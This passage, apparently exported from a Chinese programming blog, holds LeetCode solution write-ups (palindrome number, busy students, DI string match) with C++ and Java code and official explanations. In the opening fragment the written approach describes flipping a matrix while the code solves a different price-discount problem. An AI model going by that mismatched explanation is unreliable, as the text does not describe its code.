<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历每一行，然后对每一行中的元素翻转交换元素的值（swap函数），再反转元素的值，注意特殊情况，矩阵行数为奇数时中间元素要特殊处理反转一次。</p>
<p><strong>c++代码：</strong>(执行用时8ms，击败80.74%，内存消耗10M，击败27.13%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">finalPrices</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//简单，直接遍历</span></span><br><span class="line">        <span class="keyword">int</span> n=prices.size();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;n;++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(prices[j]&lt;=prices[i])&#123;</span><br><span class="line">                    prices[i]-=prices[j];</span><br><span class="line">                    <span class="comment">//找到了当前商品的折扣跳出循环</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> prices;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，简简单单的一道题.</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>回文数</title>
    <url>/2020/10/23/%E5%9B%9E%E6%96%87%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/palindrome-number/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>判断一个整数是否是回文数。回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：121</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：-121</span><br><span class="line">输出：false</span><br><span class="line">解释：从左向右读，为-121。从右向左读，为121-。因此它不是一个回文数。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：10</span><br><span class="line">输出：false</span><br><span class="line">解释：从右向左读，为01。因此它不是一个回文数。</span><br></pre></td></tr></table></figure>
<p><strong>进阶：</strong></p>
<p>你能不将整数转为字符串来解决这个问题吗？</p>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>进阶说不要转成字符串能解决吗，我本来就没打算把整数转成字符串🤣，这题跟上次做的那道<a href="https://z2bns.github.io/2020/10/22/%E6%95%B4%E6%95%B0%E5%8F%8D%E8%BD%AC/">整数反转</a>采用相似的想法，把这个整数反转得到的值和原来的整数进行比较，若相等则是回文数，否则则输出false。</p>
<p>下面是自己提交通过的代码，执行用时12ms，内存消耗6.1M：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//x为负数时绝对不是回文数</span></span><br><span class="line">        <span class="keyword">if</span>(x&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> rev=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> tmp=x;</span><br><span class="line">        <span class="comment">//反转</span></span><br><span class="line">        <span class="keyword">while</span>(x!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> pop=x%<span class="number">10</span>;</span><br><span class="line">            x/=<span class="number">10</span>;</span><br><span class="line">            <span class="comment">//要把所有合理的输入所产生的情况都考虑到，以前在其它平台做的题还是不严谨</span></span><br><span class="line">            <span class="comment">//提前判定反转后是否溢出</span></span><br><span class="line">            <span class="keyword">if</span>(rev&gt;INT_MAX/<span class="number">10</span> || (rev==INT_MAX/<span class="number">10</span> &amp;&amp;pop&gt;<span class="number">7</span>))<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span>(rev&lt;INT_MIN/<span class="number">10</span> || (rev==INT_MIN/<span class="number">10</span> &amp;&amp; pop&lt;<span class="number">-8</span>)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            rev=rev*<span class="number">10</span>+pop; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(rev==tmp)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>不过既然还可以整数转字符串来做，就实现了吧，下面是代码，执行用时20ms，内存消耗6.1M：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//整数x转成字符串</span></span><br><span class="line">        <span class="built_in">string</span> s= to_string(x);</span><br><span class="line">        <span class="keyword">int</span> len=s.length();</span><br><span class="line">        <span class="comment">//字符串前后进行比较</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len/<span class="number">2</span>;i++)&#123;</span><br><span class="line">            <span class="comment">//c++没有后面开始的索引，不然还可以用s[-i-1]</span></span><br><span class="line">            <span class="keyword">if</span>(s[i]!=s[len-i<span class="number">-1</span>])&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解："><a href="#官方题解：" class="headerlink" title="官方题解："></a>官方题解：</h6><p><strong>方法：反转一半数字</strong><br><strong>思路</strong></p>
<p>映入脑海的第一个想法是将数字转换为字符串，并检查字符串是否为回文。但是，这需要额外的非常量空间来创建问题描述中所不允许的字符串。</p>
<p>第二个想法是将数字本身反转，然后将反转后的数字与原始数字进行比较，如果它们是相同的，那么这个数字就是回文。<br>但是，如果反转后的数字大于 $\text{int.MAX}$，我们将遇到整数溢出问题。</p>
<p>按照第二个想法，为了避免数字反转可能导致的溢出问题，为什么不考虑只反转 $\text{int}$ 数字的一半？毕竟，如果该数字是回文，其后半部分反转后应该与原始数字的前半部分相同。</p>
<p>例如，输入 1221，我们可以将数字 “1221” 的后半部分从 “21” 反转为 “12”，并将其与前半部分 “12” 进行比较，因为二者相同，我们得知数字 1221 是回文。</p>
<p><strong>算法</strong></p>
<p>首先，我们应该处理一些临界情况。所有负数都不可能是回文，例如：-123 不是回文，因为 - 不等于 3。所以我们可以对所有负数返回 false。除了 0 以外，所有个位是 0 的数字不可能是回文，因为最高位不等于 0。所以我们可以对所有大于 0 且个位是 0 的数字返回 false。</p>
<p>现在，让我们来考虑如何反转后半部分的数字。</p>
<p>对于数字 1221，如果执行 1221 % 10，我们将得到最后一位数字 1，要得到倒数第二位数字，我们可以先通过除以 10 把最后一位数字从 1221 中移除，1221 / 10 = 122，再求出上一步结果除以 10 的余数，122 % 10 = 2，就可以得到倒数第二位数字。如果我们把最后一位数字乘以 10，再加上倒数第二位数字，1 * 10 + 2 = 12，就得到了我们想要的反转后的数字。如果继续这个过程，我们将得到更多位数的反转数字。</p>
<p>现在的问题是，我们如何知道反转数字的位数已经达到原始数字位数的一半？</p>
<p>由于整个过程我们不断将原始数字除以 10，然后给反转后的数字乘上 10，所以，当原始数字小于或等于反转后的数字时，就意味着我们已经处理了一半位数的数字了。</p>
<p><img src="/2020/10/23/%E5%9B%9E%E6%96%87%E6%95%B0/9_fig1.png" alt="img"></p>
<p><strong>代码</strong>（执行用时16ms，内存消耗6M）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 特殊情况：</span></span><br><span class="line">        <span class="comment">// 如上所述，当 x &lt; 0 时，x 不是回文数。</span></span><br><span class="line">        <span class="comment">// 同样地，如果数字的最后一位是 0，为了使该数字为回文，</span></span><br><span class="line">        <span class="comment">// 则其第一位数字也应该是 0</span></span><br><span class="line">        <span class="comment">// 只有 0 满足这一属性</span></span><br><span class="line">        <span class="keyword">if</span> (x &lt; <span class="number">0</span> || (x % <span class="number">10</span> == <span class="number">0</span> &amp;&amp; x != <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> revertedNumber = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (x &gt; revertedNumber) &#123;</span><br><span class="line">            revertedNumber = revertedNumber * <span class="number">10</span> + x % <span class="number">10</span>;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当数字长度为奇数时，我们可以通过 revertedNumber/10 去除处于中位的数字。</span></span><br><span class="line">        <span class="comment">// 例如，当输入为 12321 时，在 while 循环的末尾我们可以得到 x = 12，revertedNumber = 123，</span></span><br><span class="line">        <span class="comment">// 由于处于中位的数字不影响回文（它总是与自己相等），所以我们可以简单地将其去除。</span></span><br><span class="line">        <span class="keyword">return</span> x == revertedNumber || x == revertedNumber / <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(log(n))$，对于每次迭代，我们会将输入除以10，因此时间复杂度为O(log(n))。</li>
<li>空间复杂度：$O(1)$。我们只需要常数空间存放若干变量。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>感觉自己写的已经差不多是最优了，但题解总是能进一步对算法优化，反转一半数字并用反转的前半部分和反转的后半部分比较作为反转完成条件，这个方法就很nice。我觉得自己缺乏算法锻炼、性能优化这方面的思维。很多时候就觉得只要完成功能就ok了，对性能这方面没有太大的考虑，其实这方面还是挺重要的。还是需要做多些题，不断地学习进步吧🤓。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>在既定时间做作业的学生人数</title>
    <url>/2020/11/10/%E5%9C%A8%E6%97%A2%E5%AE%9A%E6%97%B6%E9%97%B4%E5%81%9A%E4%BD%9C%E4%B8%9A%E7%9A%84%E5%AD%A6%E7%94%9F%E4%BA%BA%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/number-of-students-doing-homework-at-a-given-time/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你两个整数数组 <code>startTime</code>（开始时间）和 <code>endTime</code>（结束时间），并指定一个整数 <code>queryTime</code> 作为查询时间。</p>
<p>已知，第 <code>i</code> 名学生在 <code>startTime[i]</code> 时开始写作业并于 <code>endTime[i]</code> 时完成作业。</p>
<p>请返回在查询时间 <code>queryTime</code> 时正在做作业的学生人数。形式上，返回能够使 <code>queryTime</code> 处于区间 <code>[startTime[i], endTime[i]]</code>（含）的学生人数。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：startTime &#x3D; [1,2,3], endTime &#x3D; [3,2,7], queryTime &#x3D; 4</span><br><span class="line">输出：1</span><br><span class="line">解释：一共有 3 名学生。</span><br><span class="line">第一名学生在时间 1 开始写作业，并于时间 3 完成作业，在时间 4 没有处于做作业的状态。</span><br><span class="line">第二名学生在时间 2 开始写作业，并于时间 2 完成作业，在时间 4 没有处于做作业的状态。</span><br><span class="line">第三名学生在时间 3 开始写作业，预计于时间 7 完成作业，这是是唯一一名在时间 4 时正在做作业的学生。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：startTime &#x3D; [4], endTime &#x3D; [4], queryTime &#x3D; 4</span><br><span class="line">输出：1</span><br><span class="line">解释：在查询时间只有一名学生在做作业。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：startTime &#x3D; [4], endTime &#x3D; [4], queryTime &#x3D; 5</span><br><span class="line">输出：0</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：startTime &#x3D; [1,1,1,1], endTime &#x3D; [1,3,2,4], queryTime &#x3D; 7</span><br><span class="line">输出：0</span><br></pre></td></tr></table></figure>
<p><strong>示例5：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：startTime &#x3D; [9,8,7,6,5,4,3,2,1], endTime &#x3D; [10,10,10,10,10,10,10,10,10], queryTime &#x3D; 5</span><br><span class="line">输出：5</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>startTime.length == endTime.length</code></li>
<li><code>1 &lt;= startTime.length &lt;= 100</code></li>
<li><code>1 &lt;= startTime[i] &lt;= endTime[i] &lt;= 1000</code></li>
<li><code>1 &lt;= queryTime &lt;= 1000</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>直接遍历数组，判断queryTime是否处在区间中就可以了</p>
<p><strong>c++代码：</strong>(执行用时8ms，击败47.51%，内存消耗11.2M，击败5.08%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">busyStudent</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; startTime, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; endTime, <span class="keyword">int</span> queryTime)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;startTime.size();++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(queryTime&gt;=startTime[i] &amp;&amp; queryTime&lt;=endTime[i])&#123;</span><br><span class="line">                ++result;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，太简单了🙄</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>增减字符串匹配</title>
    <url>/2020/11/20/%E5%A2%9E%E5%87%8F%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/di-string-match/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定只含 <code>&quot;I&quot;</code>（增大）或 <code>&quot;D&quot;</code>（减小）的字符串 <code>S</code> ，令 <code>N = S.length</code>。</p>
<p>返回 <code>[0, 1, ..., N]</code> 的任意排列 <code>A</code> 使得对于所有 <code>i = 0, ..., N-1</code>，都有：</p>
<ul>
<li>如果 <code>S[i] == &quot;I&quot;</code>，那么 <code>A[i] &lt; A[i+1]</code></li>
<li>如果 <code>S[i] == &quot;D&quot;</code>，那么 <code>A[i] &gt; A[i+1]</code></li>
</ul>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：&quot;IDID&quot;</span><br><span class="line">输出：[0,4,1,3,2]</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：&quot;III&quot;</span><br><span class="line">输出：[0,1,2,3]</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：&quot;DDI&quot;</span><br><span class="line">输出：[3,2,0,1]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= S.length &lt;= 10000</code></li>
<li><code>S</code> 只包含字符 <code>&quot;I&quot;</code> 或 <code>&quot;D&quot;</code>。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>根据题目分析，字符串中第一个‘D’位置对应的A中的元素值最大为N，第二‘D’对应元素值为N-1，以此顺序依次减小。第一个‘I’位置对应的A中元素值最小为0，第二个‘I’对应元素值加1，以此顺序依次增大，A中最后一个元素在字符串S中没有对应，其值为最后一个‘I’对应元素值加1或最后一个‘D’对应元素值减1。遍历字符串，对字符的不同值‘I’或‘D’进行相应处理。</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败40.65%，内存消耗9.2M，击败16.95%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">diStringMatch</span><span class="params">(<span class="built_in">string</span> S)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">int</span> N=S.length();</span><br><span class="line">        <span class="keyword">int</span> little=<span class="number">0</span>,big=S.length();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> c:S)&#123;</span><br><span class="line">            <span class="keyword">if</span>(c==<span class="string">&#x27;I&#x27;</span>)&#123;</span><br><span class="line">                result.emplace_back(little);</span><br><span class="line">                ++little;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                result.emplace_back(big);</span><br><span class="line">                --big;</span><br><span class="line">            &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">        result.emplace_back(little);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/di-string-match/solution/zeng-jian-zi-fu-chuan-pi-pei-by-leetcode/">官方题解</a>:</h6><p><strong>分析</strong></p>
<p>我们首先考虑字符串中的第一个字母。如果 <code>S[0] == &#39;I&#39;</code>，那么我们只要令 <code>A[0] = 0</code>，就一定能满足 <code>A[0] &lt; A[1]</code>。如果 <code>S[0] == &#39;D&#39;</code>，同样我们只要令 <code>A[0] = N</code>，就一定能满足 <code>A[0] &gt; A[1]</code>。</p>
<p>接下来，当我们考虑 <code>S</code> 中剩下的 <code>N - 1</code> 个字母时，还剩下 <code>N</code> 个数可以使用，这 <code>N</code> 个数为 <code>[0 .. N - 1]</code> 或 <code>[1 .. N]</code>。可以发现，由于 <code>S[0]</code> 的值已经确定，那么剩下 <code>S</code> 中的 <code>N - 1</code> 个字母和 <code>N</code> 个可用的数变成了一个和原问题相同，但规模为 <code>N - 1</code> 的问题。即如果 <code>S[1] == &#39;I&#39;</code>，我们就令 <code>A[1]</code> 为剩下数中最小的那个数；如果 <code>S[1] == &#39;D&#39;</code>，我们就令 <code>A[1]</code> 为剩下数中最大的那个数。</p>
<p>我们每次会把可以使用的数的集合中的最小值或最大值取出，并放到当前的位置，因此可以使用的数的集合总是连续的，就可以非常方便的进行维护。</p>
<p><strong>Java代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] diStringMatch(String S) &#123;</span><br><span class="line">        <span class="keyword">int</span> N = S.length();</span><br><span class="line">        <span class="keyword">int</span> lo = <span class="number">0</span>, hi = N;</span><br><span class="line">        <span class="keyword">int</span>[] ans = <span class="keyword">new</span> <span class="keyword">int</span>[N + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (S.charAt(i) == <span class="string">&#x27;I&#x27;</span>)</span><br><span class="line">                ans[i] = lo++;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                ans[i] = hi--;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ans[N] = lo;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(N)$，其中 $N$ 是字符串 <code>S</code> 的长度。</li>
<li>空间复杂度：$O(N)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解虽然分析过程和我描述的有些差别，但思路是一致的，代码也基本相同，不过官方题解是Java实现的，题目也还好，比较容易想到👦。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>奇数值单元格的数目</title>
    <url>/2020/11/13/%E5%A5%87%E6%95%B0%E5%80%BC%E5%8D%95%E5%85%83%E6%A0%BC%E7%9A%84%E6%95%B0%E7%9B%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/cells-with-odd-values-in-a-matrix/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个 <code>n</code> 行 <code>m</code> 列的矩阵，最开始的时候，每个单元格中的值都是 <code>0</code>。</p>
<p>另有一个索引数组 <code>indices</code>，<code>indices[i] = [ri, ci]</code> 中的 <code>ri</code> 和 <code>ci</code> 分别表示指定的行和列（从 <code>0</code> 开始编号）。</p>
<p>你需要将每对 <code>[ri, ci]</code> 指定的行和列上的所有单元格的值加 <code>1</code>。</p>
<p>请你在执行完所有 <code>indices</code> 指定的增量操作后，返回矩阵中 「奇数值单元格」 的数目。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<p><img src="/2020/11/13/%E5%A5%87%E6%95%B0%E5%80%BC%E5%8D%95%E5%85%83%E6%A0%BC%E7%9A%84%E6%95%B0%E7%9B%AE/e1.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 2, m &#x3D; 3, indices &#x3D; [[0,1],[1,1]]</span><br><span class="line">输出：6</span><br><span class="line">解释：最开始的矩阵是 [[0,0,0],[0,0,0]]。</span><br><span class="line">第一次增量操作后得到 [[1,2,1],[0,1,0]]。</span><br><span class="line">最后的矩阵是 [[1,3,1],[1,3,1]]，里面有 6 个奇数。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
